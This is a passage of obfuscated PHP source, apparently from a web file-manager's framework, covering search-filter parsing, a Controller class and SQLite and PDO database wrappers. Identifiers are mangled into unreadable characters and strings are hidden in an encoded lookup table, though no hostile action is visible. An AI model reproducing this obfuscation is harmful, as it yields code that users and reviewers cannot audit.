$Åıè®ÙÃ = array_slice($Åıè®ÙÃ, 0, intval($”ÏÉÈ¼¢)); return $Åıè®ÙÃ; } private function _listSearchBindPinyin($¸˜€¨‡¨, &$öœ—¡í€, &$‰ùúÕ·å) { $§÷¥‹Œé =& $_SERVER[¯‘·½]; if (!isset($¸˜€¨‡¨[$§÷¥‹Œé[2105]]) || !$¸˜€¨‡¨[$§÷¥‹Œé[2105]]) { return; } if (!Input::check($¸˜€¨‡¨[$§÷¥‹Œé[2105]], $§÷¥‹Œé[395]) || strlen($¸˜€¨‡¨[$§÷¥‹Œé[2105]]) < 2) { return; } $ŠÖËû»‰ = "\x4c\x45\106\x54\x20\x4a\x4f\x49\116\40{$this->tablePrefix}\x69\157\x5f\x73\157\x75\x72\143\x65\x5f\x6d\x65\x74\141\x20\x6d\x65\x74\141\40\x6f\156\x20\x73\x6f\x75\x72\143\145\56\x73\x6f\165\x72\x63\145\x49\104\40\x3d\x20\155\x65\164\141\x2e\x73\157\x75\162\x63\145\111\104"; $ÅÆÀÀÓË = array(); $‰ùúÕ·å = str_replace(array($§÷¥‹Œé[288], $§÷¥‹Œé[53], $§÷¥‹Œé[2284]), $§÷¥‹Œé[12], $‰ùúÕ·å); $‰ùúÕ·å = $§÷¥‹Œé[513] . str_replace($§÷¥‹Œé[50], $§÷¥‹Œé[514], $‰ùúÕ·å); $‹˜îè² = $öœ—¡í€[$§÷¥‹Œé[32]]; unset($öœ—¡í€[$§÷¥‹Œé[32]]); foreach ($öœ—¡í€ as $¶î¯ñ¯é => $ØŠ£ê—Ğ) { $ÅÆÀÀÓË[$§÷¥‹Œé[513] . $¶î¯ñ¯é] = $ØŠ£ê—Ğ; } foreach ($‹˜îè² as $Ì‚³ßæÃ) { $ÅÆÀÀÓË[] = array($§÷¥‹Œé[518] => $Ì‚³ßæÃ, $§÷¥‹Œé[1096] => $§÷¥‹Œé[2109], array($§÷¥‹Œé[2285] => $Ì‚³ßæÃ, $§÷¥‹Œé[2286] => array($§÷¥‹Œé[7], array($§÷¥‹Œé[540], $§÷¥‹Œé[539])))); } $this->join($ŠÖËû»‰); $öœ—¡í€ = $ÅÆÀÀÓË; } private function _parseSearchWhere($öˆæ«³†) { $Øë°Ù =& $_SERVER[¯‘·½]; $Ë½û§¢ = array(); if (isset($öˆæ«³†[$Øë°Ù[846]]) && $öˆæ«³†[$Øë°Ù[846]]) { $Ë½û§¢[$Øë°Ù[88]] = array($Øë°Ù[2287], $öˆæ«³†[$Øë°Ù[846]]); } if (isset($öˆæ«³†[$Øë°Ù[847]]) && $öˆæ«³†[$Øë°Ù[847]]) { $œÆí¶ˆ = array($Øë°Ù[2288], $öˆæ«³†[$Øë°Ù[847]]); if ($Ë½û§¢[$Øë°Ù[88]]) { $Ë½û§¢[$Øë°Ù[88]] = array($Ë½û§¢[$Øë°Ù[88]], $œÆí¶ˆ, $Øë°Ù[2289]); } else { $Ë½û§¢[$Øë°Ù[88]] = $œÆí¶ˆ; } } if (isset($öˆæ«³†[$Øë°Ù[2281]]) && $öˆæ«³†[$Øë°Ù[2281]] > 0) { $Ë½û§¢[$Øë°Ù[79]] = array($Øë°Ù[2287], $öˆæ«³†[$Øë°Ù[2281]]); } if (isset($öˆæ«³†[$Øë°Ù[2282]]) && $öˆæ«³†[$Øë°Ù[2282]]) { $œÆí¶ˆ = array($Øë°Ù[2288], $öˆæ«³†[$Øë°Ù[2282]]); if ($Ë½û§¢[$Øë°Ù[79]]) { $Ë½û§¢[$Øë°Ù[79]] = array($Ë½û§¢[$Øë°Ù[79]], $œÆí¶ˆ, $Øë°Ù[2289]); } else { $Ë½û§¢[$Øë°Ù[79]] = $œÆí¶ˆ; } } if (isset($öˆæ«³†[$Øë°Ù[669]]) && $öˆæ«³†[$Øë°Ù[669]]) { $Ë½û§¢[] = array($Øë°Ù[531] => $öˆæ«³†[$Øë°Ù[669]], $Øë°Ù[529] => $öˆæ«³†[$Øë°Ù[669]], $Øë°Ù[1096] => $Øë°Ù[2109]); } if (isset($öˆæ«³†[$Øë°Ù[488]]) && $öˆæ«³†[$Øë°Ù[488]]) { $üˆĞÉİç = $öˆæ«³†[$Øë°Ù[488]]; if ($üˆĞÉİç == $Øë°Ù[78]) { $Ë½û§¢[$Øë°Ù[487]] = 1; } else { if ($üˆĞÉİç == $Øë°Ù[2290]) { $Ë½û§¢[$Øë°Ù[487]] = 0; } else { if ($üˆĞÉİç) { $üˆĞÉİç = is_array($üˆĞÉİç) ? $üˆĞÉİç : explode($Øë°Ù[50], $üˆĞÉİç); $Ë½û§¢[$Øë°Ù[488]] = array($Øë°Ù[494], $üˆĞÉİç); $Ë½û§¢[$Øë°Ù[487]] = 0; } } } } $this->_parseSearchParent($öˆæ«³†, $Ë½û§¢); if (isset($öˆæ«³†[$Øë°Ù[2105]]) && trim($öˆæ«³†[$Øë°Ù[2105]])) { $Ê´õÖ—… = trim($öˆæ«³†[$Øë°Ù[2105]]); $ƒäÁñù§ = explode($Øë°Ù[53], $Ê´õÖ—…); if (strlen($Ê´õÖ—…) > 2 && (substr($Ê´õÖ—…, 0, 1) == $Øë°Ù[121] && substr($Ê´õÖ—…, -1) == $Øë°Ù[121]) || substr($Ê´õÖ—…, 0, 1) == $Øë°Ù[58] && substr($Ê´õÖ—…, -1) == $Øë°Ù[58]) { $Ê´õÖ—… = substr($Ê´õÖ—…, 1, -1); $ƒäÁñù§ = array($Ê´õÖ—…); } $Ë½û§¢[$Øë°Ù[32]] = array(array($Øë°Ù[619], $Øë°Ù[2107] . $Ê´õÖ—… . $Øë°Ù[2107])); if (count($ƒäÁñù§) > 1) { $Ë½û§¢[$Øë°Ù[32]] = array(); foreach ($ƒäÁñù§ as $¨Í¥Æ„¦) { if (!trim($¨Í¥Æ„¦)) { continue; } $Ë½û§¢[$Øë°Ù[32]][] = array($Øë°Ù[619], $Øë°Ù[2107] . trim($¨Í¥Æ„¦) . $Øë°Ù[2107]); } } } return $Ë½û§¢; } private function _parseSearchParent($áêØÛ…ê, &$èÌ¶“ÀÑ) { $–å¤ƒ„ =& $_SERVER[¯‘·½]; if (!isset($áêØÛ…ê[$–å¤ƒ„[193]]) || !$áêØÛ…ê[$–å¤ƒ„[193]]) { return; } $İ×ÒÔäª = $this->pathInfo($áêØÛ…ê[$–å¤ƒ„[193]]); $³™ÁÜ © = $İ×ÒÔäª[$–å¤ƒ„[193]] . $–å¤ƒ„[12] === $–å¤ƒ„[231]; $È÷ì˜îÃ = $İ×ÒÔäª[$–å¤ƒ„[191]] == $–å¤ƒ„[582]; if ($İ×ÒÔäª[$–å¤ƒ„[598]] == $–å¤ƒ„[599]) { $ÅñÊ«¡á = $this->sourceInfo($áêØÛ…ê[$–å¤ƒ„[193]]); $İ×ÒÔäª[$–å¤ƒ„[588]] = $ÅñÊ«¡á[$–å¤ƒ„[588]]; } $èÌ¶“ÀÑ[$–å¤ƒ„[659]] = array($–å¤ƒ„[619], $İ×ÒÔäª[$–å¤ƒ„[588]] . $áêØÛ…ê[$–å¤ƒ„[193]] . $–å¤ƒ„[620]); $¶²¤À™Ê = isset($áêØÛ…ê[$–å¤ƒ„[1966]]) && in_array($–å¤ƒ„[582], $áêØÛ…ê[$–å¤ƒ„[1966]]); if (!$¶²¤À™Ê || !$È÷ì˜îÃ || !$³™ÁÜ © || !$İ×ÒÔäª[$–å¤ƒ„[489]]) { return; } if (!AuthModel::authCheckRoot($İ×ÒÔäª[$–å¤ƒ„[489]][$–å¤ƒ„[490]])) { return; } $Ÿ‚ û›Ü = $İ×ÒÔäª[$–å¤ƒ„[573]] . $–å¤ƒ„[12]; if ($Ÿ‚ û›Ü == $–å¤ƒ„[91]) { unset($èÌ¶“ÀÑ[$–å¤ƒ„[659]]); $èÌ¶“ÀÑ[$–å¤ƒ„[191]] = self::TYPE_GROUP; return; } $°ÎÂ¯´ç = Model($–å¤ƒ„[589])->groupChildrenAll($Ÿ‚ û›Ü); $ºİœÌä½ = count($°ÎÂ¯´ç); if ($ºİœÌä½ <= 1) { return; } $İùğ‘É® = array($–å¤ƒ„[193] => 0, $–å¤ƒ„[191] => self::TYPE_GROUP, $–å¤ƒ„[573] => array($–å¤ƒ„[7], $°ÎÂ¯´ç)); $âôÁÂÙŒ = $this->field($–å¤ƒ„[2291])->where($İùğ‘É®)->limit($ºİœÌä½)->select(); $èÌ¶“ÀÑ[$–å¤ƒ„[659]] = array(); foreach ($âôÁÂÙŒ as $€­óš£ğ) { $èÌ¶“ÀÑ[$–å¤ƒ„[659]][] = array($–å¤ƒ„[619], $–å¤ƒ„[597] . $€­óš£ğ[$–å¤ƒ„[194]] . $–å¤ƒ„[620]); } $èÌ¶“ÀÑ[$–å¤ƒ„[659]][] = $–å¤ƒ„[2109]; } } goto díÅÚ§ñœÒ; BÍª´®í: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $Í€¾áå =& $_SERVER[¯‘·½]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$Í€¾áå[6]] =& $config; $this->values[$Í€¾áå[7]] =& $in; $this->tpl = TEMPLATE . MOD . $Í€¾áå[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($‚Ìû“®) { if (1 === func_num_args()) { $this->{$‚Ìû“®} = new $‚Ìû“®(); } else { $šÈ…•¶‡ = new ReflectionClass($‚Ìû“®); $·úÉÈıÚ = func_get_args(); array_shift($·úÉÈıÚ); $this->{$‚Ìû“®} = $šÈ…•¶‡->newInstanceArgs($·úÉÈıÚ); } return $this->{$‚Ìû“®}; } public function routeBind($é½¡…, $Ñû™†š‰, $¦‡õÌ‡Ï = 3) { $„¤™ú—ü =& $_SERVER[¯‘·½]; $ÂõüÒÀ = $this->in[$„¤™ú—ü[9]]; $é½¡… = str_replace($„¤™ú—ü[10], $„¤™ú—ü[11], trim(trim($é½¡…, $„¤™ú—ü[8]), $„¤™ú—ü[12])); if (!$é½¡… || count($ÂõüÒÀ) <= $¦‡õÌ‡Ï) { return !1; } $–”²‚Î¯ = !0; $™¨¡‰É = explode($„¤™ú—ü[8], $é½¡…); for ($øÆğÔ“ = 0; $øÆğÔ“ < count($™¨¡‰É); $øÆğÔ“++) { if ($™¨¡‰É[$øÆğÔ“] != $ÂõüÒÀ[$¦‡õÌ‡Ï + $øÆğÔ“]) { $–”²‚Î¯ = !1; break; } } if (!$–”²‚Î¯) { return; } call_user_func_array(array($this, $Ñû™†š‰), array()); } public function routeArgs($±İ¸‹Œ¤ = 3) { $â•òÔÜà = $this->in[$_SERVER[¯‘·½][9]]; if (count($â•òÔÜà) <= $±İ¸‹Œ¤) { return array(); } $ñ¿îÛÃù = array(); for ($×…™ÅÜš = $±İ¸‹Œ¤; $×…™ÅÜš < count($â•òÔÜà); $×…™ÅÜš += 2) { $ñ¿îÛÃù[$â•òÔÜà[$×…™ÅÜš]] = $â•òÔÜà[$×…™ÅÜš + 1]; $this->in[$â•òÔÜà[$×…™ÅÜš]] = $â•òÔÜà[$×…™ÅÜš + 1]; } return $ñ¿îÛÃù; } protected function assign($âÚü¦Åª, $•äàœëù) { $this->values[$âÚü¦Åª] = $•äàœëù; } protected function display($òíÀû¤¡) { ob_end_clean(); extract($this->values); require $this->tpl . $òíÀû¤¡; } } class DbSqliteBase extends Db { public function __construct($áæëŒø = '') { $¡¿ä¨©ì =& $_SERVER[¯‘·½]; if (!extension_loaded($¡¿ä¨©ì[13])) { think_exception(think_lang($¡¿ä¨©ì[14]) . $¡¿ä¨©ì[15]); } if (!empty($áæëŒø)) { if (!isset($áæëŒø[$¡¿ä¨©ì[16]])) { $áæëŒø[$¡¿ä¨©ì[16]] = 438; } $this->config = $áæëŒø; if (empty($this->config[$¡¿ä¨©ì[17]])) { $this->config[$¡¿ä¨©ì[17]] = array(); } } } public function connect($¨÷ÃˆåŠ = '', $Î˜×¤Ş˜ = 0) { $ìàÚ—®û =& $_SERVER[¯‘·½]; if (!isset($this->linkID[$Î˜×¤Ş˜])) { if (empty($¨÷ÃˆåŠ)) { $¨÷ÃˆåŠ = $this->config; } $» üûù = !empty($¨÷ÃˆåŠ[$ìàÚ—®û[17]][$ìàÚ—®û[18]]) ? $¨÷ÃˆåŠ[$ìàÚ—®û[17]][$ìàÚ—®û[18]] : $this->pconnect; $¦½Æ­Ë = $» üûù ? $ìàÚ—®û[19] : $ìàÚ—®û[20]; $this->linkID[$Î˜×¤Ş˜] = $¦½Æ­Ë($¨÷ÃˆåŠ[$ìàÚ—®û[21]], $¨÷ÃˆåŠ[$ìàÚ—®û[16]]); if (!$this->linkID[$Î˜×¤Ş˜]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$Î˜×¤Ş˜], 30000); if (1 != think_config($ìàÚ—®û[22])) { unset($this->config); } } return $this->linkID[$Î˜×¤Ş˜]; } public function free() { $this->queryID = null; } public function query($æ—ïùĞ‰) { $õÅĞ¼§ö =& $_SERVER[¯‘·½]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $æ—ïùĞ‰; if ($this->queryID) { $this->free(); } think_action_status($õÅĞ¼§ö[23], 1); think_status($õÅĞ¼§ö[24]); $this->queryID = sqlite_query($this->_linkID, $æ—ïùĞ‰); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ìÑ²«İ” = $this->getAll(); return $ìÑ²«İ”; } } public function execute($˜†‰Ç³Ì) { $” ÁÉ¾Ş =& $_SERVER[¯‘·½]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $˜†‰Ç³Ì; if ($this->queryID) { $this->free(); } think_action_status($” ÁÉ¾Ş[25], 1); think_status($” ÁÉ¾Ş[24]); $åÖóÉ¢ = sqlite_exec($this->_linkID, $˜†‰Ç³Ì); $this->debug(); if (!1 === $åÖóÉ¢) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¯‘·½][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ªá®ñ‹— = sqlite_query($this->_linkID, $_SERVER[¯‘·½][27]); if (!$ªá®ñ‹—) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ëŠÛò› = sqlite_query($this->_linkID, $_SERVER[¯‘·½][28]); if (!$ëŠÛò›) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $€°‹‘¸ = array(); if ($this->numRows > 0) { for ($‚Í÷ÜÙá = 0; $‚Í÷ÜÙá < $this->numRows; $‚Í÷ÜÙá++) { $€°‹‘¸[$‚Í÷ÜÙá] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $€°‹‘¸; } public function getFields($Ñƒ–àªõ) { $˜ƒ†ÔÙ =& $_SERVER[¯‘·½]; $ĞİæöõÙ = $this->query($˜ƒ†ÔÙ[29] . $Ñƒ–àªõ . $˜ƒ†ÔÙ[30]); $İ£“¢·¥ = array(); if ($ĞİæöõÙ) { foreach ($ĞİæöõÙ as $Œ‹õ¿Ù => $ç”¤²ƒ) { $İ£“¢·¥[$ç”¤²ƒ[$˜ƒ†ÔÙ[31]]] = array($˜ƒ†ÔÙ[32] => $ç”¤²ƒ[$˜ƒ†ÔÙ[31]], $˜ƒ†ÔÙ[33] => $ç”¤²ƒ[$˜ƒ†ÔÙ[34]], $˜ƒ†ÔÙ[35] => (bool) ($ç”¤²ƒ[$˜ƒ†ÔÙ[36]] === $˜ƒ†ÔÙ[12]), $˜ƒ†ÔÙ[37] => $ç”¤²ƒ[$˜ƒ†ÔÙ[38]], $˜ƒ†ÔÙ[39] => strtolower($ç”¤²ƒ[$˜ƒ†ÔÙ[40]]) == $˜ƒ†ÔÙ[41], $˜ƒ†ÔÙ[42] => strtolower($ç”¤²ƒ[$˜ƒ†ÔÙ[43]]) == $˜ƒ†ÔÙ[44]); } } return $İ£“¢·¥; } public function getTables($÷ìüİŒ½ = '') { $éšÉ“±§ =& $_SERVER[¯‘·½]; $£¶ëõ·€ = $this->query($éšÉ“±§[45] . $éšÉ“±§[46] . $éšÉ“±§[47]); $»åèÄÛ¤ = array(); foreach ($£¶ëõ·€ as $–ôŠ”Ù‰ => $ÃíÚ¤À) { $»åèÄÛ¤[$–ôŠ”Ù‰] = current($ÃíÚ¤À); } return $»åèÄÛ¤; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÓèÉø¦´ =& $_SERVER[¯‘·½]; $ÑÊê¬ˆ¥ = sqlite_last_error($this->_linkID); $this->error = $ÑÊê¬ˆ¥ . $ÓèÉø¦´[4] . sqlite_error_string($ÑÊê¬ˆ¥); if ($ÓèÉø¦´[12] != $this->queryStr) { $this->error .= LNG($ÓèÉø¦´[48]) . $this->queryStr; } think_trace($this->error, $ÓèÉø¦´[12], $ÓèÉø¦´[49]); return $this->error; } public function escapeString($÷æÔÑ÷) { return sqlite_escape_string($÷æÔÑ÷); } public function parseLimit($ÒÀüòäÙ) { $¿şÒÈâ =& $_SERVER[¯‘·½]; $Úé¼èÕ = $¿şÒÈâ[12]; if (!empty($ÒÀüòäÙ)) { $ÒÀüòäÙ = explode($¿şÒÈâ[50], $ÒÀüòäÙ); if (count($ÒÀüòäÙ) > 1) { $Úé¼èÕ .= $¿şÒÈâ[51] . $ÒÀüòäÙ[1] . $¿şÒÈâ[52] . $ÒÀüòäÙ[0] . $¿şÒÈâ[53]; } else { $Úé¼èÕ .= $¿şÒÈâ[51] . $ÒÀüòäÙ[0] . $¿şÒÈâ[53]; } } return $Úé¼èÕ; } } class DbSqlite3Base extends Db { public function __construct($œ†…Ø´ = '') { $«‘£Â•ş =& $_SERVER[¯‘·½]; if (!class_exists($«‘£Â•ş[54])) { think_exception(think_lang($«‘£Â•ş[14]) . $«‘£Â•ş[55]); } if (!empty($œ†…Ø´)) { if (!isset($œ†…Ø´[$«‘£Â•ş[16]])) { $œ†…Ø´[$«‘£Â•ş[16]] = 438; } $this->config = $œ†…Ø´; if (empty($this->config[$«‘£Â•ş[17]])) { $this->config[$«‘£Â•ş[17]] = array(); } } } public function connect($øà¾’Óä = '', $ÓŠÖ¿Í = 0) { $áŞñºÕ¸ =& $_SERVER[¯‘·½]; if (!isset($this->linkID[$ÓŠÖ¿Í])) { if (empty($øà¾’Óä)) { $øà¾’Óä = $this->config; } $this->linkID[$ÓŠÖ¿Í] = new SQLite3($øà¾’Óä[$áŞñºÕ¸[21]]); if (!$this->linkID[$ÓŠÖ¿Í]) { think_exception($this->linkID[$ÓŠÖ¿Í]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ÓŠÖ¿Í]->busyTimeout(30000); if (1 != think_config($áŞñºÕ¸[22])) { unset($this->config); } } return $this->linkID[$ÓŠÖ¿Í]; } public function free() { $this->queryID = null; } public function query($Şïçµ½) { $ÚÆ”Œ½ä =& $_SERVER[¯‘·½]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Şïçµ½; if ($this->queryID) { $this->free(); } think_action_status($ÚÆ”Œ½ä[23], 1); think_status($ÚÆ”Œ½ä[24]); $this->queryID = $this->_linkID->query($Şïçµ½); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $œì¯ª€Ğ = $this->getAll(); $this->numRows = count($œì¯ª€Ğ); return $œì¯ª€Ğ; } } public function execute($³ÃÌÔ°ô) { $Â•ªüâŠ =& $_SERVER[¯‘·½]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $³ÃÌÔ°ô; if ($this->queryID) { $this->free(); } think_action_status($Â•ªüâŠ[25], 1); think_status($Â•ªüâŠ[24]); $‡î˜ƒ¸é = $this->_linkID->exec($³ÃÌÔ°ô); $this->debug(); if (!1 === $‡î˜ƒ¸é) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¯‘·½][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÕÛ¾­õÔ = $this->_linkID->query($_SERVER[¯‘·½][27]); if (!$ÕÛ¾­õÔ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ê¶¯ÏÍÄ = $this->_linkID->query($_SERVER[¯‘·½][28]); if (!$Ê¶¯ÏÍÄ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $‰ÁÎâª = array(); while ($¯¹òÑ–É = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $‰ÁÎâª[] = $¯¹òÑ–É; } $this->queryID->reset(); return $‰ÁÎâª; } public function getFields($Ş®½¨ÚÊ) { $¬”•æçç =& $_SERVER[¯‘·½]; $ııØ‚œ° = $this->query($¬”•æçç[29] . $Ş®½¨ÚÊ . $¬”•æçç[30]); $òÌõ½° = array(); if ($ııØ‚œ°) { foreach ($ııØ‚œ° as $•¨ó™æÇ => $Û×¤¶ı) { $òÌõ½°[$Û×¤¶ı[$¬”•æçç[32]]] = array($¬”•æçç[32] => $Û×¤¶ı[$¬”•æçç[32]], $¬”•æçç[33] => $Û×¤¶ı[$¬”•æçç[33]], $¬”•æçç[35] => (bool) ($Û×¤¶ı[$¬”•æçç[35]] === $¬”•æçç[12]), $¬”•æçç[37] => $Û×¤¶ı[$¬”•æçç[56]], $¬”•æçç[39] => (bool) $Û×¤¶ı[$¬”•æçç[57]], $¬”•æçç[42] => (bool) $Û×¤¶ı[$¬”•æçç[57]]); } } return $òÌõ½°; } public function getTables($©¸ÉŸúû = '') { $òõ¼Œºó =& $_SERVER[¯‘·½]; $ ¥¹è = $this->query($òõ¼Œºó[45] . $òõ¼Œºó[46] . $òõ¼Œºó[47]); $¸‘É¼«È = array(); foreach ($ ¥¹è as $Ãîá¬Œœ => $Íœß®Â) { $¸‘É¼«È[$Ãîá¬Œœ] = current($Íœß®Â); } return $¸‘É¼«È; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $‡“¹†²• =& $_SERVER[¯‘·½]; $this->error = $this->_linkID->lastErrorMsg(); if ($‡“¹†²•[12] != $this->queryStr) { $this->error .= LNG($‡“¹†²•[48]) . $this->queryStr; } think_trace($this->error, $‡“¹†²•[12], $‡“¹†²•[49]); return $this->error; } public function escapeString($á¹È©ß±) { $Ô”£¥¥¬ =& $_SERVER[¯‘·½]; if ($this->_linkID) { return $this->_linkID->escapeString($á¹È©ß±); } return str_ireplace($Ô”£¥¥¬[58], $Ô”£¥¥¬[59], $á¹È©ß±); } public function parseLimit($Ã®œ„) { $õâ×Ë•Ã =& $_SERVER[¯‘·½]; $Ü’ˆİ¿ = $õâ×Ë•Ã[12]; if (!empty($Ã®œ„)) { $Ã®œ„ = explode($õâ×Ë•Ã[50], $Ã®œ„); if (count($Ã®œ„) > 1) { $Ü’ˆİ¿ .= $õâ×Ë•Ã[51] . $Ã®œ„[1] . $õâ×Ë•Ã[52] . $Ã®œ„[0] . $õâ×Ë•Ã[53]; } else { $Ü’ˆİ¿ .= $õâ×Ë•Ã[51] . $Ã®œ„[0] . $õâ×Ë•Ã[53]; } } return $Ü’ˆİ¿; } } goto f­©”³¯ä¸; AÌ©ºÖ„™Ş: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($‡ÛæÎË = '') { $¦‰³ì¶î =& $_SERVER[¯‘·½]; if (!class_exists($¦‰³ì¶î[1010])) { think_exception(think_lang($¦‰³ì¶î[14]) . $¦‰³ì¶î[1011]); } if (!empty($‡ÛæÎË)) { $this->config = $‡ÛæÎË; if (empty($this->config[$¦‰³ì¶î[17]])) { $this->config[$¦‰³ì¶î[17]] = array(); } } } public function connect($Ïñ²â»¢ = '', $³Ï†®Õì = 0) { $¼¿Ü®ä± =& $_SERVER[¯‘·½]; if (!isset($this->linkID[$³Ï†®Õì])) { if (empty($Ïñ²â»¢)) { $Ïñ²â»¢ = $this->config; } $¿¦Ö™º = !empty($Ïñ²â»¢[$¼¿Ü®ä±[17]][$¼¿Ü®ä±[18]]) ? $Ïñ²â»¢[$¼¿Ü®ä±[17]][$¼¿Ü®ä±[18]] : $this->pconnect; if ($¿¦Ö™º) { $Ïñ²â»¢[$¼¿Ü®ä±[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$³Ï†®Õì] = new PDO($Ïñ²â»¢[$¼¿Ü®ä±[1012]], $Ïñ²â»¢[$¼¿Ü®ä±[984]], $Ïñ²â»¢[$¼¿Ü®ä±[985]], $Ïñ²â»¢[$¼¿Ü®ä±[17]]); } catch (PDOException $¿í€ƒ·) { think_exception($¿í€ƒ·->getMessage()); } $this->dbType = $this->_getDsnType($Ïñ²â»¢[$¼¿Ü®ä±[1012]]); if (in_array($this->dbType, array($¼¿Ü®ä±[1013], $¼¿Ü®ä±[1014], $¼¿Ü®ä±[1015], $¼¿Ü®ä±[1016]))) { think_exception($¼¿Ü®ä±[1017] . $this->dbType . $¼¿Ü®ä±[1018] . $this->dbType . $¼¿Ü®ä±[1019]); } if (!$this->linkID[$³Ï†®Õì]) { think_exception($¼¿Ü®ä±[1020]); } try { $this->linkID[$³Ï†®Õì]->exec($¼¿Ü®ä±[1021] . think_config($¼¿Ü®ä±[987])); } catch (Exception $¿í€ƒ·) { } $this->connected = !0; if (1 != think_config($¼¿Ü®ä±[22])) { unset($this->config); } } return $this->linkID[$³Ï†®Õì]; } public function free() { $this->PDOStatement = null; } public function query($äÊ‡Ç‘Ÿ, $±æñÑ = array()) { $¡áãó†ş =& $_SERVER[¯‘·½]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $äÊ‡Ç‘Ÿ; if (!empty($±æñÑ)) { $this->queryStr .= $¡áãó†ş[1022] . print_r($±æñÑ, !0) . $¡áãó†ş[1023]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($¡áãó†ş[23], 1); think_status($¡áãó†ş[24]); $this->PDOStatement = $this->_linkID->prepare($äÊ‡Ç‘Ÿ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $èÇ¸ = $this->PDOStatement->execute($±æñÑ); $this->debug(); if (!1 === $èÇ¸) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($‘Øİõèí, $İØÓ¦™© = array()) { $Óİ¦ğ =& $_SERVER[¯‘·½]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‘Øİõèí; if (!empty($İØÓ¦™©)) { $this->queryStr .= $Óİ¦ğ[1022] . print_r($İØÓ¦™©, !0) . $Óİ¦ğ[1023]; } $¿ïóÒÚ = !1; if ($this->dbType == $Óİ¦ğ[1016]) { if (preg_match($Óİ¦ğ[1024], $this->queryStr, $·øïŸ§)) { $this->table = think_config($Óİ¦ğ[1025]) . str_ireplace(think_config($Óİ¦ğ[1026]), $Óİ¦ğ[456], $·øïŸ§[2]); $¿ïóÒÚ = (bool) $this->query($Óİ¦ğ[1027] . strtoupper($this->table) . $Óİ¦ğ[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Óİ¦ğ[25], 1); think_status($Óİ¦ğ[24]); $this->PDOStatement = $this->_linkID->prepare($‘Øİõèí); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ÑçÅÉ±ß = $this->PDOStatement->execute($İØÓ¦™©); $this->debug(); if (!1 === $ÑçÅÉ±ß) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($¿ïóÒÚ || preg_match($Óİ¦ğ[1028], $‘Øİõèí)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Äò¯“ÜÍ = $this->_linkID->commit(); $this->transTimes = 0; if (!$Äò¯“ÜÍ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $…è—­œê = $this->_linkID->rollback(); $this->transTimes = 0; if (!$…è—­œê) { $this->error(); return !1; } } return !0; } private function getAll() { $¨†µü = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($¨†µü); return $¨†µü; } public function getFields($ä…§Ì½¿) { $Ù«éœ =& $_SERVER[¯‘·½]; $this->initConnect(!0); if (think_config($Ù«éœ[1029])) { $¹ôşê¯¶ = str_replace($Ù«éœ[1030], $ä…§Ì½¿, think_config($Ù«éœ[1029])); } else { switch ($this->dbType) { case $Ù«éœ[1013]: case $Ù«éœ[1031]: $¹ôşê¯¶ = 